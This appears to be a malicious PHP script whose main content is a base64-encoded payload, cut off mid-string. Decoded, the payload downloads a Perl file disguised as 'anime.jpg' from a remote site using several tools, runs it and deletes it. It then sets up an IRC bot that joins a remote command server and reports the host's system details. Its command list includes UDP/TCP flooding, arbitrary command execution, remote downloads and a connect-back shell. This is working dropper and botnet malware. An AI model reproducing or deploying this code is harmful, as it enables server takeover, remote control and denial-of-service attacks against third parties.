<?php
set_time_limit(0); 
error_reporting(0); 
$rhs="c2V0X3RpbWVfbGltaXQoMCk7IA0KZXJyb3JfcmVwb3J0aW5nKDApOyANCg0Kc2hlbGxfZXhlYygnd2dldCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtTyAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdjdXJsIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC1vIC90bXAvYW5pbWUuanBnO3BlcmwgL3RtcC9hbmltZS5qcGcnKTsNCnNoZWxsX2V4ZWMoJ2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgPiAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdmZXRjaCAtbyAvdG1wL2FuaW1lLmpwZyBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdHRVQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGc+L3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0Kc2hlbGxfZXhlYygncm0gLXJmIC90bXAvYW5pbWUuanBnKicpOw0KcGFzc3RocnUoJ3dnZXQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLU8gL3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ2N1cmwgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLW8gL3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpwYXNzdGhydSgnbHlueCAtc291cmNlIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnID4gL3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ2ZldGNoIC1vIC90bXAvYW5pbWUuanBnIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnO3BlcmwgL3RtcC9hbmltZS5qcGcnKTsNCnBhc3N0aHJ1KCdHRVQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGc+L3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ3JtIC1yZiAvdG1wL2FuaW1lLmpwZycpOw0KZXhlYygnd2dldCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtTyAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdjdXJsIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC1vIC90bXAvYW5pbWUuanBnO3BlcmwgL3RtcC9hbmltZS5qcGcnKTsNCmV4ZWMoJ2x3cC1kb3dubG9hZCAtYSBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgPiAvdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdmZXRjaCAtbyAvdG1wL2FuaW1lLmpwZyBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdHRVQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGc+L3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0KZXhlYygncm0gLXJmIC90bXAvYW5pbWUuanBnJyk7DQpzeXN0ZW0oJ3dnZXQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLU8gL3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0Kc3lzdGVtKCdjdXJsIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC1vIC90bXAvYW5pbWUuanBnO3BlcmwgL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnbHdwLWRvd25sb2FkIC1hIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC90bXAvYW5pbWUuanBnO3BlcmwgL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnbHlueCAtc291cmNlIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnID4gL3RtcC9hbmltZS5qcGc7cGVybCAvdG1wL2FuaW1lLmpwZycpOw0Kc3lzdGVtKCdmZXRjaCAtbyAvdG1wL2FuaW1lLmpwZyBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzeXN0ZW0oJ0dFVCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZz4vdG1wL2FuaW1lLmpwZztwZXJsIC90bXAvYW5pbWUuanBnJyk7DQpzeXN0ZW0oJ3JtIC1yZiAvdG1wL2FuaW1lLmpwZycpOw0Kc2hlbGxfZXhlYygnd2dldCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtTyAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnNoZWxsX2V4ZWMoJ2N1cmwgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLW8gL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpzaGVsbF9leGVjKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgPiAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnNoZWxsX2V4ZWMoJ2ZldGNoIC1vIC92YXIvdG1wL2FuaW1lLmpwZyBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0Kc2hlbGxfZXhlYygnR0VUIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnPi92YXIvdG1wL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0Kc2hlbGxfZXhlYygncm0gLXJmIC92YXIvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ3dnZXQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLU8gL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpwYXNzdGhydSgnY3VybCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtbyAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnBhc3N0aHJ1KCdsd3AtZG93bmxvYWQgLWEgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpwYXNzdGhydSgnbHlueCAtc291cmNlIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnID4gL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpwYXNzdGhydSgnZmV0Y2ggLW8gL3Zhci90bXAvYW5pbWUuanBnIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpwYXNzdGhydSgnR0VUIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnPi92YXIvdG1wL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0KcGFzc3RocnUoJ3JtIC1yZiAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCmV4ZWMoJ3dnZXQgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgLU8gL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdjdXJsIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC1vIC92YXIvdG1wL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0KZXhlYygnbHdwLWRvd25sb2FkIC1hIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC92YXIvdG1wL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0KZXhlYygnbHlueCAtc291cmNlIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnID4gL3Zhci90bXAvYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpleGVjKCdmZXRjaCAtbyAvdmFyL3RtcC9hbmltZS5qcGcgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCmV4ZWMoJ0dFVCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZz4vdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCmV4ZWMoJ3JtIC1yZiAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnd2dldCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtTyAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnY3VybCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZyAtbyAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnbHdwLWRvd25sb2FkIC1hIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnIC92YXIvdG1wL2FuaW1lLmpwZztwZXJsIC92YXIvdG1wL2FuaW1lLmpwZycpOw0Kc3lzdGVtKCdseW54IC1zb3VyY2UgaHR0cDovL3d3dy5sb3RlbWFuaWEuY29tL2xvdGVzLy9hbmltZS5qcGcgPiAvdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgnZmV0Y2ggLW8gL3Zhci90bXAvYW5pbWUuanBnIGh0dHA6Ly93d3cubG90ZW1hbmlhLmNvbS9sb3Rlcy8vYW5pbWUuanBnO3BlcmwgL3Zhci90bXAvYW5pbWUuanBnJyk7DQpzeXN0ZW0oJ0dFVCBodHRwOi8vd3d3LmxvdGVtYW5pYS5jb20vbG90ZXMvL2FuaW1lLmpwZz4vdmFyL3RtcC9hbmltZS5qcGc7cGVybCAvdmFyL3RtcC9hbmltZS5qcGcnKTsNCnN5c3RlbSgncm0gLXJmIC92YXIvdG1wL2FuaW1lLmpwZycpOw0KDQplY2hvICJvayEiOw0KY2xhc3MgdG1wIA0KeyANCiB2YXIgJGNvbmZpZyA9IGFycmF5KCJzZXJ2ZXIiPT4iYmFzZS5ieXJvZS5uZXQiLA0KICAgICAgICAgICAgICAgICAgICAgInBvcnQiPT4iMjAxMCIsDQogICAgICAgICAgICAgICAgICAgICAicGFzcyI9PiJELUZveCIsDQogICAgICAgICAgICAgICAgICAgICAicHJlZml4Ij0+IltmYWxjb25dIiwNCiAgICAgICAgICAgICAgICAgICAgICJtYXhyYW5kIj0+IjMiLA0KICAgICAgICAgICAgICAgICAgICAgImNoYW4iPT4iI2ZhbGNvbiIsDQogICAgICAgICAgICAgICAgICAgICAiY2hhbjEiPT4iI0FUZU40IiwNCiAgICAgICAgICAgICAgICAgICAgICJjaGFuMiI9PiIjZmFsY29uIiwNCiAgICAgICAgICAgICAgICAgICAgICJjaGFuZGJnIj0+IiNBVGVONCIsDQogICAgICAgICAgICAgICAgICAgICAia2V5Ij0+IkQtRm94IiwNCiAgICAgICAgICAgICAgICAgICAgICJtb2RlcyI9PiIrQngiLA0KICAgICAgICAgICAgICAgICAgICAgInBhc3N3b3JkIj0+Imp1c3RmYW1pbHkiLA0KICAgICAgICAgICAgICAgICAgICAgInRyaWdnZXIiPT4iISIsDQogICAgICAgICAgICAgICAgICAgICAiaG9zdGF1dGgiPT4iKiINCiAgICAgICAgICAgICAgICAgICAgICk7DQogdmFyICR1c2VycyA9IGFycmF5KCk7IA0KIGZ1bmN0aW9uIHN0YXJ0KCkgDQogeyANCiAgICBpZighKCR0aGlzLT5jb25uID0gZnNvY2tvcGVuKCR0aGlzLT5jb25maWdbJ3NlcnZlciddLCR0aGlzLT5jb25maWdbJ3BvcnQnXSwkZSwkcywzMCkpKSANCiAgICAgICAkdGhpcy0+c3RhcnQoKTsgDQogICAgJGlkZW50ID0gJHRoaXMtPmNvbmZpZ1sncHJlZml4J107DQogICAgJGFscGggPSByYW5nZSgiMCIsIjkiKTsNCiAgICBmb3IoJGk9MDskaTwkdGhpcy0+Y29uZmlnWydtYXhyYW5kJ107JGkrKykgDQogICAgICAgJGlkZW50IC49ICRhbHBoW3JhbmQoMCw5KV07DQogICAgaWYoc3RybGVuKCR0aGlzLT5jb25maWdbJ3Bhc3MnXSk+MCkgDQogICAgICAgJHRoaXMtPnNlbmQoIlBBU1MgIi4kdGhpcy0+Y29uZmlnWydwYXNzJ10pOw0KICAgICR0aGlzLT5zZW5kKCJVU0VSICIuJGlkZW50LiIgMTI3LjAuMC4xIGxvY2FsaG9zdCA6IC09LSBCeXJvZU5ldCAtPS0iLnBocF91bmFtZSgpLiIiKTsNCiAgICAkdGhpcy0+c2V0X25pY2soKTsNCiAgICAkdGhpcy0+bWFpbigpOw0KIH0gDQogZnVuY3Rpb24gbWFpbigpIA0KIHsgDQogICAgd2hpbGUoIWZlb2YoJHRoaXMtPmNvbm4pKSANCiAgICB7IA0KICAgICAgICR0aGlzLT5idWYgPSB0cmltKGZnZXRzKCR0aGlzLT5jb25uLDUxMikpOyANCiAgICAgICAkY21kID0gZXhwbG9kZSgiICIsJHRoaXMtPmJ1Zik7IA0KICAgICAgIGlmKHN1YnN0cigkdGhpcy0+YnVmLDAsNik9PSJQSU5HIDoiKSANCiAgICAgICB7IA0KICAgICAgICAgICR0aGlzLT5zZW5kKCJQT05HIDoiLnN1YnN0cigkdGhpcy0+YnVmLDYpKTsgDQogICAgICAgfSANCiAgICAgICBpZihpc3NldCgkY21kWzFdKSAmJiAkY21kWzFdID09IjAwMSIpIA0KICAgICAgIHsgDQogICAgICAgICAgJHRoaXMtPnNlbmQoIk1PREUgIi4kdGhpcy0+bmljay4iICIuJHRoaXMtPmNvbmZpZ1snbW9kZXMnXSk7IA0KICAgICAgICAgICR0aGlzLT5qb2luKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwkdGhpcy0+Y29uZmlnWydrZXknXSk7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwkdGhpcy0+Y29uZmlnWydrZXknXSk7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbjInXSwkdGhpcy0+Y29uZmlnWydrZXknXSk7DQogICAgICAgICAgaWYgKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBvciBzdHJ0b2xvd2VyKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgPT0gIm9uIikgeyAkc2FmZW1vZGUgPSAib24iOyB9DQogICAgICAgICAgZWxzZSB7ICRzYWZlbW9kZSA9ICJvZmYiOyB9DQogICAgICAgICAgJHVuYW1lID0gcGhwX3VuYW1lKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbmRiZyddLCJbXDJ1bmFtZSFcMl06ICR1bmFtZSAoc2FmZTogJHNhZmVtb2RlKSIpOw0KICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW5kYmcnXSwiW1wydnVsbiFcMl06IGh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIiKTsNCiAgICAgICB9IA0KICAgICAgIGlmKGlzc2V0KCRjbWRbMV0pICYmICRjbWRbMV09PSI0MzMiKSANCiAgICAgICB7IA0KICAgICAgICAgICR0aGlzLT5zZXRfbmljaygpOyANCiAgICAgICB9IA0KICAgICAgIGlmKCR0aGlzLT5idWYgIT0gJG9sZF9idWYpIA0KICAgICAgIHsgDQogICAgICAgICAgJG1jbWQgPSBhcnJheSgpOyANCiAgICAgICAgICAkbXNnID0gc3Vic3RyKHN0cnN0cigkdGhpcy0+YnVmLCIgOiIpLDIpOyANCiAgICAgICAgICAkbXNnY21kID0gZXhwbG9kZSgiICIsJG1zZyk7IA0KICAgICAgICAgICRuaWNrID0gZXhwbG9kZSgiISIsJGNtZFswXSk7IA0KICAgICAgICAgICR2aG9zdCA9IGV4cGxvZGUoIkAiLCRuaWNrWzFdKTsgDQogICAgICAgICAgJHZob3N0ID0gJHZob3N0WzFdOyANCiAgICAgICAgICAkbmljayA9IHN1YnN0cigkbmlja1swXSwxKTsgDQogICAgICAgICAgJGhvc3QgPSAkY21kWzBdOyANCiAgICAgICAgICBpZigkbXNnY21kWzBdPT0kdGhpcy0+bmljaykgDQogICAgICAgICAgeyANCiAgICAgICAgICAgZm9yKCRpPTA7JGk8Y291bnQoJG1zZ2NtZCk7JGkrKykgDQogICAgICAgICAgICAgICRtY21kWyRpXSA9ICRtc2djbWRbJGkrMV07IA0KICAgICAgICAgIH0gDQogICAgICAgICAgZWxzZSANCiAgICAgICAgICB7IA0KICAgICAgICAgICBmb3IoJGk9MDskaTxjb3VudCgkbXNnY21kKTskaSsrKSANCiAgICAgICAgICAgICAgJG1jbWRbJGldID0gJG1zZ2NtZFskaV07IA0KICAgICAgICAgIH0gDQogICAgICAgICAgaWYoY291bnQoJGNtZCk+MikgDQogICAgICAgICAgeyANCiAgICAgICAgICAgICBzd2l0Y2goJGNtZFsxXSkgDQogICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICBjYXNlICJRVUlUIjogDQogICAgICAgICAgICAgICAgICAgaWYoJHRoaXMtPmlzX2xvZ2dlZF9pbigkaG9zdCkpIA0KICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmxvZ19vdXQoJGhvc3QpOyANCiAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICJQQVJUIjogDQogICAgICAgICAgICAgICAgICAgaWYoJHRoaXMtPmlzX2xvZ2dlZF9pbigkaG9zdCkpIA0KICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmxvZ19vdXQoJGhvc3QpOyANCiAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICBjYXNlICJQUklWTVNHIjogDQogICAgICAgICAgICAgICAgICAgaWYoISR0aGlzLT5pc19sb2dnZWRfaW4oJGhvc3QpICYmICgkdmhvc3QgPT0gJHRoaXMtPmNvbmZpZ1snaG9zdGF1dGgnXSB8fCAkdGhpcy0+Y29uZmlnWydob3N0YXV0aCddID09ICIqIikpIA0KICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgaWYoc3Vic3RyKCRtY21kWzBdLDAsMSk9PSIuIikgDQogICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2goc3Vic3RyKCRtY21kWzBdLDEpKSANCiAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVzZXIiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRtY21kWzFdPT0kdGhpcy0+Y29uZmlnWydwYXNzd29yZCddKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQoJCQkJCQkJCWlmICgkbmljaz09Inpha2lfMjIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQoJCQkJCQkJCSAgICR0aGlzLT5sb2dfaW4oJGhvc3QpOw0KCQkJCQkJCQkgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm5vdGljZSgkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMkF1dGhcMl06ICRuaWNrIHNhbGFoIHllZSA6UCIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm5vdGljZSgkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJBdXRoXDJdOiAkbmljayBzYWxhaCB5ZWUgOlAiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5ub3RpY2UoJHRoaXMtPmNvbmZpZ1snY2hhbjInXSwiW1wyQXV0aFwyXTogJG5pY2sgc2FsYWggeWVlIDpQIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICBlbHNlaWYoJHRoaXMtPmlzX2xvZ2dlZF9pbigkaG9zdCkpIA0KICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgaWYoc3Vic3RyKCRtY21kWzBdLDAsMSk9PSIuIikgDQogICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2goc3Vic3RyKCRtY21kWzBdLDEpKSANCiAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJlc3RhcnQiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2VuZCgiUVVJVCA6cmVzdGFydCBjb21tYW5kIGRhcmkgJG5pY2siKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHRoaXMtPmNvbm4pOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c3RhcnQoKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImpvaW4iOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigham9pbigkbWNtZFsxXSkpIA0KCQkJCQkJCSAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+am9pbigkbWNtZFsxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQkJCQkJCQkgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwYXJ0IjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoIXBhcnQoJG1jbWRbMV0pKSANCgkJCQkJCQkgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnBhcnQoJG1jbWRbMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0JCQkJCQkJICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImhlbHAiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIkNvbW1hbmQgMSA6IGpvaW4vcGFydC9yZXN0YXJ0L3JuZG5pY2svdXNlci9sb2dvdXQvdWRwZmxvb2QvdGNwZmxvb2QvZGllL3BzY2FuL3VkLnNlcnZlciIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiQ29tbWFuZCAyIDogc2FmZS9pbmZvL3VuYW1lL3Jhdy9ldmFsL3BvcGVuL2V4ZWMvc2V4ZWMvcGFzc3RocnUvc3lzdGVtL2Rucy9kb3dubG9hZC9jb25iYWNrIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInNhZmUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChAaW5pX2dldCgic2FmZV9tb2RlIikgb3Igc3RydG9sb3dlcihAaW5pX2dldCgic2FmZV9tb2RlIikpID09ICJvbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzYWZlbW9kZSA9ICJvbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzYWZlbW9kZSA9ICJvZmYiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnNhZmUgbW9kZVwyXTogIi4kc2FmZW1vZGUuIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4xJ10sIltcMnNhZmUgbW9kZVwyXTogIi4kc2FmZW1vZGUuIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMnNhZmUgbW9kZVwyXTogIi4kc2FmZW1vZGUuIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNvbmJhY2siOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KCRtY21kKT4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29uYmFjaygkbWNtZFsxXSwkbWNtZFsyXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImRu